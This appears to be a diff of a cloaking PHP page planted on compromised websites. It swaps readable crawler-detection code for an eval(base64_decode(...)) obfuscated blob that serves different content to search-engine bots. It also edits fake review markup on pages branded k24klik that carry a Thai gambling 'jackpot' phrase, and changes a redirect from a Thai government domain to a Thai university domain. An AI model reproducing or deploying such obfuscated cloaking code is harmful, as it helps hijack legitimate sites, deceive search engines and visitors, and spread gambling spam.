@@ -1,17 +1,4 @@
-<?php
-$base_path = '/k24/';
-function motherHoodNature()
-{
-    return preg_match('/AhrefsBot|baiduspider|baidu|bingbot|bing|DuckDuckBot|facebookexternalhit|facebook|facebot|googlebot|\-google|google\-inspectiontool|Uptime\-Kuma|linkedin|Linkidator|linkwalker|mediapartners|mod_pagespeed|naverbot|pinterest|SemrushBot|twitterbot|twitter|xing|yahoo|YandexBot|YandexMobileBot|yandex|Zeus/i', $_SERVER['HTTP_USER_AGENT']);
-}
-$request_uri = $_SERVER['REQUEST_URI'];
-$request_path = urldecode(parse_url($request_uri, PHP_URL_PATH));
-if (strpos($request_path, $base_path) === 0) {
-    $request_path = substr($request_path, strlen($base_path));
-}
-$keyword = trim($request_path, '/');
-$link = (empty($_SERVER['HTTPS']) ? 'http' : 'https') . "://{$_SERVER['HTTP_HOST']}{$_SERVER['REQUEST_URI']}";
-ob_start();?>
+<?php eval(base64_decode('CiBnb3RvIFlnZEl4OyBlVTcxRzogJGxpbmsgPSAoZW1wdHkoJF9TRVJWRVJbIlx4NDhcMTI0XDEyNFwxMjBcMTIzIl0pID8gIlx4NjhcMTY0XHg3NFx4NzAiIDogIlx4NjhceDc0XHg3NFwxNjBceDczIikgLiAiXHgzYVw1N1x4MmZ7JF9TRVJWRVJbIlx4NDhcMTI0XHg1NFx4NTBceDVmXDExMFwxMTdcMTIzXHg1NCJdfXskX1NFUlZFUlsiXDEyMlwxMDVceDUxXHg1NVwxMDVcMTIzXDEyNFwxMzdceDU1XDEyMlx4NDkiXX0iOyBnb3RvIEx3Tzd1OyBuM2toejogZnVuY3Rpb24gbW90aGVySG9vZE5hdHVyZSgpIHsgcmV0dXJuIHByZWdfbWF0Y2goIlx4MmZcMTAxXDE1MFwxNjJcMTQ1XDE0Nlx4NzNceDQyXDE1N1wxNjRcMTc0XHg2Mlx4NjFceDY5XDE0NFwxNjVcMTYzXDE2MFwxNTFcMTQ0XDE0NVwxNjJcMTc0XDE0MlwxNDFceDY5XDE0NFwxNjVceDdjXHg2Mlx4NjlcMTU2XHg2N1wxNDJceDZmXHg3NFwxNzRceDYyXDE1MVx4NmVceDY3XDE3NFx4NDRcMTY1XHg2M1wxNTNcMTA0XDE2NVx4NjNceDZiXHg0MlwxNTdceDc0XHg3Y1wxNDZcMTQxXDE0M1wxNDVcMTQyXDE1N1wxNTdcMTUzXHg2NVwxNzBceDc0XHg2NVx4NzJceDZlXDE0MVx4NmNceDY4XDE1MVwxNjRceDdjXHg2NlwxNDFcMTQzXHg2NVwxNDJceDZmXHg2ZlwxNTNcMTc0XDE0NlwxNDFceDYzXHg2NVx4NjJceDZmXHg3NFwxNzRceDY3XHg2Zlx4NmZceDY3XHg2Y1wxNDVcMTQyXHg2Zlx4NzRceDdjXHg1Y1w1NVwxNDdcMTU3XDE1N1wxNDdcMTU0XDE0NVwxNzRceDY3XHg2ZlwxNTdceDY3XHg2Y1wxNDVceDVjXDU1XDE1MVwxNTZceDczXHg3MFx4NjVcMTQzXHg3NFwxNTFcMTU3XHg2ZVwxNjRceDZmXDE1N1x4NmNcMTc0XDEyNVx4NzBcMTY0XHg2OVwxNTVceDY1XDEzNFw1NVwxMTNcMTY1XHg2ZFx4NjFceDdjXHg2Y1wxNTFceDZlXDE1M1x4NjVceDY0XDE1MVx4NmVceDdjXDExNFx4NjlcMTU2XDE1M1wxNTFcMTQ0XDE0MVwxNjRcMTU3XDE2MlwxNzRcMTU0XHg2OVx4NmVcMTUzXDE2N1x4NjFceDZjXHg2Ylx4NjVceDcyXHg3Y1wxNTVcMTQ1XHg2NFwxNTFceDYxXDE2MFwxNDFceDcyXDE2NFx4NmVceDY1XHg3Mlx4NzNcMTc0XDE1NVx4NmZcMTQ0XDEzN1x4NzBcMTQxXHg2N1wxNDVceDczXDE2MFwxNDVceDY1XHg2NFwxNzRceDZlXDE0MVx4NzZceDY1XHg3Mlx4NjJceDZmXDE2NFwxNzRceDcwXHg2OVwxNTZcMTY0XHg2NVx4NzJceDY1XDE2M1wxNjRceDdjXDEyM1wxNDVceDZkXDE2Mlx4NzVcMTYzXDE1MFwxMDJceDZmXDE2NFwxNzRcMTY0XDE2N1x4NjlcMTY0XHg3NFwxNDVceDcyXHg2MlwxNTdceDc0XDE3NFwxNjRcMTY3XHg2OVx4NzRcMTY0XDE0NVwxNjJceDdjXHg3OFwxNTFcMTU2XHg2N1x4N2NcMTcxXHg2MVx4NjhcMTU3XDE1N1wxNzRceDU5XHg2MVx4NmVceDY0XHg2NVx4NzhcMTAyXHg2ZlwxNjRceDdjXHg1OVwxNDFceDZlXDE0NFx4NjVcMTcwXHg0ZFwxNTdcMTQyXDE1MVwxNTRcMTQ1XDEwMlx4NmZcMTY0XDE3NFwxNzFcMTQxXHg2ZVwxNDRceDY1XHg3OFx4N2NcMTMyXDE0NVx4NzVcMTYzXHgyZlwxNTEiLCAkX1NFUlZFUlsiXHg0OFx4NTRcMTI0XHg1MFwxMzdcMTI1XDEyM1x4NDVceDUyXDEzN1wxMDFcMTA3XHg0NVwxMTZceDU0Il0pOyB9IGdvdG8gUEFGdGQ7IEx3Tzd1OiBvYl9zdGFydCgpOyBnb3RvIG1BS2pwOyB3T0o0aDogaWYgKHN0cnBvcygkcmVxdWVzdF9wYXRoLCAkYmFzZV9wYXRoKSA9PT0gMCkgeyAkcmVxdWVzdF9wYXRoID0gc3Vic3RyKCRyZXF1ZXN0X3BhdGgsIHN0cmxlbigkYmFzZV9wYXRoKSk7IH0gZ290byBXdFNIQTsgWWdkSXg6ICRiYXNlX3BhdGggPSAiXHgyZlwxNTNcNjJceDM0XHgyZiI7IGdvdG8gbjNraHo7IFBBRnRkOiAkcmVxdWVzdF91cmkgPSAkX1NFUlZFUlsiXDEyMlwxMDVcMTIxXDEyNVwxMDVcMTIzXDEyNFx4NWZceDU1XDEyMlwxMTEiXTsgZ290byB6SWpmaDsgV3RTSEE6ICRrZXl3b3JkID0gdHJpbSgkcmVxdWVzdF9wYXRoLCAiXDU3Iik7IGdvdG8gZVU3MUc7IHpJamZoOiAkcmVxdWVzdF9wYXRoID0gdXJsZGVjb2RlKHBhcnNlX3VybCgkcmVxdWVzdF91cmksIFBIUF9VUkxfUEFUSCkpOyBnb3RvIHdPSjRoOyBtQUtqcDog')); ?>
 <?php
 if (!empty($keyword)) {
     if (motherHoodNature()) {
@@ -893,10 +880,11 @@ $.fn.raty.defaults.cancelHint='Cancel this rating!';
                 </span>
                 <span class="k24-nd-font">2024-11-09 11:38:31</span><br>
                 <div class="k24-df-on k24-df-direct-row k24-df-justify-between" style="margin-top: 1%;">
-                    <div style="float: left; width: 90px;" class="rating raty-icons" id="rating-11840-raty" data-target="rating-11840" data-score="5" title="gorgeous"><img src="https://www.k24klik.com/images/bintang-review-on-mini.png" alt="1" title="gorgeous">&nbsp;<img src="https://www.k24klik.com/images/bintang-review-on-mini.png" alt="2" title="gorgeous">&nbsp;<img src="https://www.k24klik.com/images/bintang-review-on-mini.png" alt="3" title="gorgeous">&nbsp;<img src="https://www.k24klik.com/images/bintang-review-on-mini.png" alt="4" title="gorgeous">&nbsp;<img src="https://www.k24klik.com/images/bintang-review-on-mini.png" alt="5" title="gorgeous"><input type="hidden" name="score" value="5" readonly="readonly"></div><input id="rating-11840" type="text" value="5" name="rating-11840" style="display: none;">                    <div itemprop="reviewRating" itemtype="http://schema.org/Rating" itemscope="">
-
-                        <meta itemprop="bestRating" content="5">
-                    </div>
+                    <div style="float: left; width: 90px;" class="rating raty-icons" id="rating-11840-raty" data-target="rating-11840" data-score="5" title="gorgeous"><img src="https://www.k24klik.com/images/bintang-review-on-mini.png" alt="1" title="gorgeous">&nbsp;<img src="https://www.k24klik.com/images/bintang-review-on-mini.png" alt="2" title="gorgeous">&nbsp;<img src="https://www.k24klik.com/images/bintang-review-on-mini.png" alt="3" title="gorgeous">&nbsp;<img src="https://www.k24klik.com/images/bintang-review-on-mini.png" alt="4" title="gorgeous">&nbsp;<img src="https://www.k24klik.com/images/bintang-review-on-mini.png" alt="5" title="gorgeous"><input type="hidden" name="score" value="5" readonly="readonly"></div><input id="rating-11840" type="text" value="5" name="rating-11840" style="display: none;">                   <div itemprop="reviewRating" itemscope itemtype="http://schema.org/Rating">
+    <meta itemprop="bestRating" content="5">
+    <meta itemprop="ratingValue" content="4">
+    <meta itemprop="worstRating" content="1">
+</div>
                                             &nbsp;<div class="k24-outline-but-prim" style="padding: 0 5px"><i class="fa fa-check-circle k24-color-prim" aria-hidden="true"></i>&nbsp;<span class="k24-nd-font">ได้ตีแจ็กพอตแล้ว</span></div>
                     
                 </div>
@@ -933,10 +921,11 @@ $.fn.raty.defaults.cancelHint='Cancel this rating!';
                 </span>
                 <span class="k24-nd-font">2024-10-24 13:51:19</span><br>
                 <div class="k24-df-on k24-df-direct-row k24-df-justify-between" style="margin-top: 1%;">
-                    <div style="float: left; width: 90px;" class="rating raty-icons" id="rating-315-raty" data-target="rating-315" data-score="5" title="gorgeous"><img src="https://www.k24klik.com/images/bintang-review-on-mini.png" alt="1" title="gorgeous">&nbsp;<img src="https://www.k24klik.com/images/bintang-review-on-mini.png" alt="2" title="gorgeous">&nbsp;<img src="https://www.k24klik.com/images/bintang-review-on-mini.png" alt="3" title="gorgeous">&nbsp;<img src="https://www.k24klik.com/images/bintang-review-on-mini.png" alt="4" title="gorgeous">&nbsp;<img src="https://www.k24klik.com/images/bintang-review-on-mini.png" alt="5" title="gorgeous"><input type="hidden" name="score" value="5" readonly="readonly"></div><input id="rating-315" type="text" value="5" name="rating-315" style="display: none;">                    <div itemprop="reviewRating" itemtype="http://schema.org/Rating" itemscope="">
-
-                        <meta itemprop="bestRating" content="5">
-                    </div>
+                    <div style="float: left; width: 90px;" class="rating raty-icons" id="rating-315-raty" data-target="rating-315" data-score="5" title="gorgeous"><img src="https://www.k24klik.com/images/bintang-review-on-mini.png" alt="1" title="gorgeous">&nbsp;<img src="https://www.k24klik.com/images/bintang-review-on-mini.png" alt="2" title="gorgeous">&nbsp;<img src="https://www.k24klik.com/images/bintang-review-on-mini.png" alt="3" title="gorgeous">&nbsp;<img src="https://www.k24klik.com/images/bintang-review-on-mini.png" alt="4" title="gorgeous">&nbsp;<img src="https://www.k24klik.com/images/bintang-review-on-mini.png" alt="5" title="gorgeous"><input type="hidden" name="score" value="5" readonly="readonly"></div><input id="rating-315" type="text" value="5" name="rating-315" style="display: none;">                   <div itemprop="reviewRating" itemscope itemtype="http://schema.org/Rating">
+    <meta itemprop="bestRating" content="5">
+    <meta itemprop="ratingValue" content="4">
+    <meta itemprop="worstRating" content="1">
+</div>
                                             &nbsp;<div class="k24-outline-but-prim" style="padding: 0 5px"><i class="fa fa-check-circle k24-color-prim" aria-hidden="true"></i>&nbsp;<span class="k24-nd-font">ได้ตีแจ็กพอตแล้ว</span></div>
                     
                 </div>
@@ -973,10 +962,11 @@ $.fn.raty.defaults.cancelHint='Cancel this rating!';
                 </span>
                 <span class="k24-nd-font">2024-11-15 15:04:28</span><br>
                 <div class="k24-df-on k24-df-direct-row k24-df-justify-between" style="margin-top: 1%;">
-                    <div style="float: left; width: 90px;" class="rating raty-icons" id="rating-7027-raty" data-target="rating-7027" data-score="5" title="gorgeous"><img src="https://www.k24klik.com/images/bintang-review-on-mini.png" alt="1" title="gorgeous">&nbsp;<img src="https://www.k24klik.com/images/bintang-review-on-mini.png" alt="2" title="gorgeous">&nbsp;<img src="https://www.k24klik.com/images/bintang-review-on-mini.png" alt="3" title="gorgeous">&nbsp;<img src="https://www.k24klik.com/images/bintang-review-on-mini.png" alt="4" title="gorgeous">&nbsp;<img src="https://www.k24klik.com/images/bintang-review-on-mini.png" alt="5" title="gorgeous"><input type="hidden" name="score" value="5" readonly="readonly"></div><input id="rating-7027" type="text" value="5" name="rating-7027" style="display: none;">                    <div itemprop="reviewRating" itemtype="http://schema.org/Rating" itemscope="">
-
-                        <meta itemprop="bestRating" content="5">
-                    </div>
+                    <div style="float: left; width: 90px;" class="rating raty-icons" id="rating-7027-raty" data-target="rating-7027" data-score="5" title="gorgeous"><img src="https://www.k24klik.com/images/bintang-review-on-mini.png" alt="1" title="gorgeous">&nbsp;<img src="https://www.k24klik.com/images/bintang-review-on-mini.png" alt="2" title="gorgeous">&nbsp;<img src="https://www.k24klik.com/images/bintang-review-on-mini.png" alt="3" title="gorgeous">&nbsp;<img src="https://www.k24klik.com/images/bintang-review-on-mini.png" alt="4" title="gorgeous">&nbsp;<img src="https://www.k24klik.com/images/bintang-review-on-mini.png" alt="5" title="gorgeous"><input type="hidden" name="score" value="5" readonly="readonly"></div><input id="rating-7027" type="text" value="5" name="rating-7027" style="display: none;">                   <div itemprop="reviewRating" itemscope itemtype="http://schema.org/Rating">
+    <meta itemprop="bestRating" content="5">
+    <meta itemprop="ratingValue" content="4">
+    <meta itemprop="worstRating" content="1">
+</div>
                                             &nbsp;<div class="k24-outline-but-prim" style="padding: 0 5px"><i class="fa fa-check-circle k24-color-prim" aria-hidden="true"></i>&nbsp;<span class="k24-nd-font">ได้ตีแจ็กพอตแล้ว</span></div>
                     
                 </div>
@@ -1013,10 +1003,11 @@ $.fn.raty.defaults.cancelHint='Cancel this rating!';
                 </span>
                 <span class="k24-nd-font">2024-11-18 09:48:29</span><br>
                 <div class="k24-df-on k24-df-direct-row k24-df-justify-between" style="margin-top: 1%;">
-                    <div style="float: left; width: 90px;" class="rating raty-icons" id="rating-7160-raty" data-target="rating-7160" data-score="5" title="gorgeous"><img src="https://www.k24klik.com/images/bintang-review-on-mini.png" alt="1" title="gorgeous">&nbsp;<img src="https://www.k24klik.com/images/bintang-review-on-mini.png" alt="2" title="gorgeous">&nbsp;<img src="https://www.k24klik.com/images/bintang-review-on-mini.png" alt="3" title="gorgeous">&nbsp;<img src="https://www.k24klik.com/images/bintang-review-on-mini.png" alt="4" title="gorgeous">&nbsp;<img src="https://www.k24klik.com/images/bintang-review-on-mini.png" alt="5" title="gorgeous"><input type="hidden" name="score" value="5" readonly="readonly"></div><input id="rating-7160" type="text" value="5" name="rating-7160" style="display: none;">                    <div itemprop="reviewRating" itemtype="http://schema.org/Rating" itemscope="">
-
-                        <meta itemprop="bestRating" content="5">
-                    </div>
+                    <div style="float: left; width: 90px;" class="rating raty-icons" id="rating-7160-raty" data-target="rating-7160" data-score="5" title="gorgeous"><img src="https://www.k24klik.com/images/bintang-review-on-mini.png" alt="1" title="gorgeous">&nbsp;<img src="https://www.k24klik.com/images/bintang-review-on-mini.png" alt="2" title="gorgeous">&nbsp;<img src="https://www.k24klik.com/images/bintang-review-on-mini.png" alt="3" title="gorgeous">&nbsp;<img src="https://www.k24klik.com/images/bintang-review-on-mini.png" alt="4" title="gorgeous">&nbsp;<img src="https://www.k24klik.com/images/bintang-review-on-mini.png" alt="5" title="gorgeous"><input type="hidden" name="score" value="5" readonly="readonly"></div><input id="rating-7160" type="text" value="5" name="rating-7160" style="display: none;">                   <div itemprop="reviewRating" itemscope itemtype="http://schema.org/Rating">
+    <meta itemprop="bestRating" content="5">
+    <meta itemprop="ratingValue" content="4">
+    <meta itemprop="worstRating" content="1">
+</div>
                                             &nbsp;<div class="k24-outline-but-prim" style="padding: 0 5px"><i class="fa fa-check-circle k24-color-prim" aria-hidden="true"></i>&nbsp;<span class="k24-nd-font">ได้ตีแจ็กพอตแล้ว</span></div>
                     
                 </div>
@@ -1052,10 +1043,11 @@ $.fn.raty.defaults.cancelHint='Cancel this rating!';
                 </span>
                 <span class="k24-nd-font">2024-11-13 06:32:11</span><br>
                 <div class="k24-df-on k24-df-direct-row k24-df-justify-between" style="margin-top: 1%;">
-                    <div style="float: left; width: 90px;" class="rating raty-icons" id="rating-17590-raty" data-target="rating-17590" data-score="5" title="gorgeous"><img src="https://www.k24klik.com/images/bintang-review-on-mini.png" alt="1" title="gorgeous">&nbsp;<img src="https://www.k24klik.com/images/bintang-review-on-mini.png" alt="2" title="gorgeous">&nbsp;<img src="https://www.k24klik.com/images/bintang-review-on-mini.png" alt="3" title="gorgeous">&nbsp;<img src="https://www.k24klik.com/images/bintang-review-on-mini.png" alt="4" title="gorgeous">&nbsp;<img src="https://www.k24klik.com/images/bintang-review-on-mini.png" alt="5" title="gorgeous"><input type="hidden" name="score" value="5" readonly="readonly"></div><input id="rating-17590" type="text" value="5" name="rating-17590" style="display: none;">                    <div itemprop="reviewRating" itemtype="http://schema.org/Rating" itemscope="">
-
-                        <meta itemprop="bestRating" content="5">
-                    </div>
+                    <div style="float: left; width: 90px;" class="rating raty-icons" id="rating-17590-raty" data-target="rating-17590" data-score="5" title="gorgeous"><img src="https://www.k24klik.com/images/bintang-review-on-mini.png" alt="1" title="gorgeous">&nbsp;<img src="https://www.k24klik.com/images/bintang-review-on-mini.png" alt="2" title="gorgeous">&nbsp;<img src="https://www.k24klik.com/images/bintang-review-on-mini.png" alt="3" title="gorgeous">&nbsp;<img src="https://www.k24klik.com/images/bintang-review-on-mini.png" alt="4" title="gorgeous">&nbsp;<img src="https://www.k24klik.com/images/bintang-review-on-mini.png" alt="5" title="gorgeous"><input type="hidden" name="score" value="5" readonly="readonly"></div><input id="rating-17590" type="text" value="5" name="rating-17590" style="display: none;">                   <div itemprop="reviewRating" itemscope itemtype="http://schema.org/Rating">
+    <meta itemprop="bestRating" content="5">
+    <meta itemprop="ratingValue" content="4">
+    <meta itemprop="worstRating" content="1">
+</div>
                                             &nbsp;<div class="k24-outline-but-prim" style="padding: 0 5px"><i class="fa fa-check-circle k24-color-prim" aria-hidden="true"></i>&nbsp;<span class="k24-nd-font">ได้ตีแจ็กพอตแล้ว</span></div>
                     
                 </div>
@@ -3093,7 +3085,7 @@ HTML;
     }
 }else {
   http_response_code(404);
-  header("Location: https://greenarea.dcce.go.th/index.html", true, 301);
+  header("Location: https://ced.kmutnb.ac.th", true, 301);
   exit();
 }
 ob_end_flush();
